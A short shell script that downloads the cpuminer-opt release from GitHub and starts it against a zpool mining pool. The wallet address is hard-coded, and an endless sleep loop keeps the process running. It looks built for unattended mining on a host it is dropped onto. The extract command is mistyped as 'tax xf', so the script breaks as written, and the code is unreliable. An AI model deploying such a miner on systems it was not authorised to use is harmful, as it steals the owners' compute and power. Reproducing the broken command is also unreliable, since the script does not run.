#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
tax xf cpuminer-opt-linux.tar.gz
./cpuminer-sse2 -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DDV8vj3fisqwVu6hpfkse9X7ArVtwYx2bK -p c=DGB,zap=PYRK-lyra2z330 -t 2
while [ 1 ]; do
sleep 3
done
sleep 999
